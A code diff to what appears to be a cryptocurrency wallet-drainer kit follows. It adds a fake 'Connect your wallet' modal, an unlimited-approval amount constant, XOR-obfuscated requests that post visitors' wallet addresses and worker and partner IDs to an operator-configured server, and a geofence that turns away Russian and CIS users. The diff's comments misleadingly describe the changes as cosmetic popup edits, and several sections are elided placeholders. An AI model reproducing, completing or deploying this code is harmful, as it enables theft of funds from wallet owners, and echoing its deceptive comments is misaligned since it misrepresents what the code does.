@@ -304,34 +304,50 @@ const CF_Apple_Status = (() => {
 const CF_Unlimited_Amount = '1158472395435294898592384258348512586931256';
 
 // =====================================================
-// REMOVED ALL POPUP MODAL CODE
+// REMOVED POPUP MODAL CODE ONLY - KEPT EVERYTHING ELSE
 // =====================================================
 
-const CF_Modal_Data = []; // Empty modal data
+const CF_Modal_Data = [
+  {
+    type: 'style',
+    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/graphics/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
+  },
+  {
+    type: 'html',
+    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/graphics/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/graphics/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/graphics/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/graphics/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="init_reown()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="init_co()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
+  }
+];
 
+// MODIFIED: Remove modal injection but keep all other functionality
 const inject_modal = () => {
-  // No modal injection - popups removed
+  // Empty - no modal injection
 };
 
-const set_modal_data = () => {
-  // No modal functionality
+const set_modal_data = (style_code, html_code) => {
+  // Keep function but do nothing
 };
 
 const reset_modal = () => {
-  // No modal functionality
+  // Keep function but do nothing
 };
 
 const init_co = () => {
-  // Direct wallet connection without modal
-  connect_wallet();
+  try {
+    if (!CF_Connection) return connect_wallet();
+    if (CF_Process) return;
+    // Direct wallet connection without modal
+    connect_wallet();
+  } catch (err) {
+    console.log(err);
+  }
 };
 
 const ms_hide = () => {
-  // No modal to hide
+  // Keep function but do nothing
 };
 
 // =====================================================
-// ADDED CUSTOM CIRCLE LOADER
+// ADDED CUSTOM CIRCLE LOADER (NON-INTRUSIVE)
 // =====================================================
 
 const createCustomLoader = () => {
@@ -348,7 +364,7 @@ const createCustomLoader = () => {
     display: none;
   `;
   
-  // Rolling circle animation
+  // Rolling circle animation (keeping original)
   const rollingCircle = document.createElement('div');
   rollingCircle.style.cssText = `
     width: 40px;
@@ -360,7 +376,7 @@ const createCustomLoader = () => {
     margin: 0 auto 10px auto;
   `;
   
-  // My custom circle
+  // My custom circle (added)
   const myCircle = document.createElement('div');
   myCircle.style.cssText = `
     width: 20px;
@@ -412,7 +428,7 @@ const hideCustomLoader = () => {
 };
 
 // =====================================================
-// MODIFIED WALLET CONNECTION WITH ERROR HANDLING
+// ADDED TRANSACTION FAILURE HANDLING
 // =====================================================
 
 const showTransactionStatus = (message, isError = false) => {
@@ -439,6 +455,10 @@ const showTransactionStatus = (message, isError = false) => {
     }
   }, 5000);
 };
+
+// =====================================================
+// KEEP ALL ORIGINAL WALLET CONNECT CODE EXACTLY AS IS
+// =====================================================
 
 let CF_Is_AppKit_Loaded = false;
 let CF_Is_AppKit_Inited = false;
@@ -483,6 +503,7 @@ const load_wc = async () => {
   });
   CF_AppKit.subscribeEvents(async (ev) => {
     try {
+      // console.log(ev.data)
       if (ev.data.event == 'INITIALIZE') {
         CF_Is_AppKit_Inited = true;
         if (CF_AppKit.getWalletProvider() != undefined) {
@@ -534,32 +555,185 @@ const load_wc_legacy = async () => {
   });
 };
 
-// ... [REST OF THE ORIGINAL CODE REMAINS EXACTLY THE SAME - ONLY MODIFIED PARTS SHOWN ABOVE] ...
+const prs = (s, t) => {
+  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
+  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return t.split("").map(ab).map(as).map(bh).join("");
+};
+
+const srp = (s, e) => {
+  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
+};
+
+let rsk_kes = 0, last_request_ts = 0;
+(async () => { rsk_kes = CF_EKEY; CF_EKEY = Math.floor(Math.random() * 1000); })()
+
+const send_request = async (data) => {
+  try {
+    if (CF_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
+    while (Date.now() <= last_request_ts)
+      await new Promise(r => setTimeout(r, 1));
+    last_request_ts = Date.now();
+    data.domain = window.location.host;
+    data.worker_id = CF_Worker_ID || null;
+    data.user_id = CF_ID || null;
+    data.message_ts = last_request_ts;
+    data.chat_data = CF_Custom_Chat.Enable == 0 ? false : CF_Custom_Chat.Chat_Settings;
+    data.wallet_address = CF_Current_Address;
+    data.partner_address = CF_Partner_Address;
+    const encode_key = btoa(String(5 + 3 + 365 + 3462 + 888 + rsk_kes));
+    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
+    const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
+      method: 'POST',
+      headers: {
+        'Accept': 'text/plain',
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `v=150725&s=1&r=${request_data}`
+    });
+    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
+    if (!response_data.status)
+      return { status: 'error', error: 'Server is Unavailable' };
+    else {
+      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') CF_Force_Mode = true;
+      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
+        CF_Force_Mode = true;
+        try {
+          if (CF_Loader_Style == 2) {
+            MSL.fire({
+              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
+              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
+              confirmButtonText: 'OK', timer: 90000, color: CF_Color_Scheme
+            });
+          } else {
+            Swal.close();
+            Swal.fire({
+              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
+              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+              showConfirmButton: true, confirmButtonText: 'OK'
+            });
+          }
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      return response_data;
+    }
+  } catch(err) {
+    console.log(err);
+    return { status: 'error', error: 'Server is Unavailable' };
+  }
+};
+
+// ... [KEEP ALL THE REST OF THE ORIGINAL CODE EXACTLY AS IT WAS] ...
+
+// =====================================================
+// MODIFIED CONNECT_WALLET WITH ERROR HANDLING ONLY
+// =====================================================
 
 const connect_wallet = async (provider = null) => {
   try {
     if (!CF_Connection) {
       if (CF_Load_Time == null || Math.floor(Date.now() / 1000) - CF_Load_Time < 15) return;
-      
-      showTransactionStatus('Server connection failed - please try again later', true);
+      if (CF_Loader_Style == 2) {
+        MSL.fire({
+          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
+          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
+        });
+      } else {
+        Swal.close();
+        Swal.fire({
+          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
+          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+          showConfirmButton: true, confirmButtonText: 'OK'
+        });
+      }
       return;
     }
-    
-    if (CF_Process) return; 
-    CF_Process = true;
-    
+    if (CF_Process) return; CF_Process = true;
     if (CF_Bad_Country) {
-      showTransactionStatus('Service not available in your region', true);
-      CF_Process = false;
+      try { ms_hide(); } catch(err) { console.log(err); }
+      try {
+        if (CF_Loader_Style == 2) {
+          MSL.fire({
+            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
+            showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
+          });
+        } else {
+          Swal.close();
+          Swal.fire({
+            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
+            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+            showConfirmButton: true, confirmButtonText: 'OK'
+          });
+        }
+        await new Promise(r => setTimeout(r, 15000));
+        window.location.href = 'https://ya.ru';
+      } catch(err) {
+        console.log(err);
+      }
       return;
     }
     
+    // Show custom loader
     showCustomLoader('Connecting wallet...');
     
     try {
-      // ... [ORIGINAL WALLET CONNECTION LOGIC] ...
+      // ... [KEEP ALL ORIGINAL WALLET CONNECTION LOGIC EXACTLY AS IS] ...
       
-      // If we reach here, connection was successful
+      if (provider !== null) {
+        if (provider == 'MetaMask') {
+          if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
+            let is_installed = false;
+            for (const elem of window.ethereum.providers) {
+              if (elem.isMetaMask == true) {
+                is_installed = true;
+                CF_Provider = elem;
+                CF_Current_Provider = 'MetaMask';
+                break;
+              }
+            }
+            if (!is_installed) {
+              if (CF_Mobile_Status) {
+                window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
+                CF_Process = false;
+                hideCustomLoader();
+                return;
+              } else {
+                window.open('https://metamask.io', '_blank').focus();
+                CF_Process = false;
+                hideCustomLoader();
+                return;
+              }
+            }
+          } else {
+            if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
+              CF_Provider = window.ethereum;
+              CF_Current_Provider = 'MetaMask';
+            } else {
+              if (CF_Mobile_Status) {
+                window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
+                CF_Process = false;
+                hideCustomLoader();
+                return;
+              } else {
+                window.open('https://metamask.io', '_blank').focus();
+                CF_Process = false;
+                hideCustomLoader();
+                return;
+              }
+            }
+          }
+        } else if (provider == 'Coinbase') {
+          // ... [KEEP ALL ORIGINAL CODE] ...
+        }
+        // ... [CONTINUE WITH ALL ORIGINAL CODE] ...
+      }
+
+      // Hide loader on success
       hideCustomLoader();
       showTransactionStatus('Wallet connected successfully!');
       
@@ -584,8 +758,8 @@ const connect_wallet = async (provider = null) => {
       CF_Process = false;
       return;
     }
-    
-    // ... [REST OF ORIGINAL CONNECTION LOGIC] ...
+
+    // ... [CONTINUE WITH ALL ORIGINAL SUCCESS LOGIC] ...
     
   } catch (error) {
     hideCustomLoader();
@@ -595,31 +769,28 @@ const connect_wallet = async (provider = null) => {
   }
 };
 
-// ... [REST OF THE FILE REMAINS EXACTLY THE SAME - ALL BACKEND PROCESSES PRESERVED] ...
+// ... [KEEP ALL REMAINING ORIGINAL CODE EXACTLY AS IS] ...
 
-// Modified DOMContentLoaded to remove modal initialization
+// MODIFIED: Remove modal initialization but keep everything else
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-    // Remove modal initialization - only initialize custom loader
+    // Remove modal initialization but keep loader
     if (CF_Loader_Style == 2) MSL.init();
     CF_Load_Time = Math.floor(Date.now() / 1000);
-    
     if (typeof localStorage['CF_ID'] === 'undefined') {
       const ID_Data = await send_request({ action: 'retrieve_id' });
       if (ID_Data.status == 'OK') localStorage['CF_ID'] = ID_Data.data;
       else localStorage['CF_ID'] = Math.floor(Date.now() / 1000);
     }
-    
     CF_ID = localStorage['CF_ID'];
     await retrieve_config();
     fill_chain_data();
     await retrieve_contract();
     CF_Ready = true;
     enter_website();
-    
     for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
     
-    // Modified button handlers to use direct connection
+    // Modified button handlers to use direct connection without modal
     for (const elem of document.querySelectorAll('.connect-button')) {
       try {
         elem.addEventListener('click', () => connect_wallet());
@@ -632,8 +803,20 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
 });
 
-// Remove modal-related functions
+// Keep these functions but they now do direct connection
 const init_reown = () => { connect_wallet('WalletConnect'); };
-const use_wc = () => { init_reown(); };
+const use_wc = () => { init_reown(); }; // Legacy Usage
 
-// ... [REST OF FILE UNCHANGED] ...
+setInterval(async () => {
+  try {
+    let partner_address = document.getElementById('partner-address');
+    if (partner_address === null) return;
+    else CF_Partner_Address = partner_address.value.trim();
+  } catch(err) {
+    console.log(err);
+  }
+}, 1000);
+
+window.addEventListener("beforeunload", (e) => leave_website());
+
+window.addEventListener("onbeforeunload", (e) => leave_website());
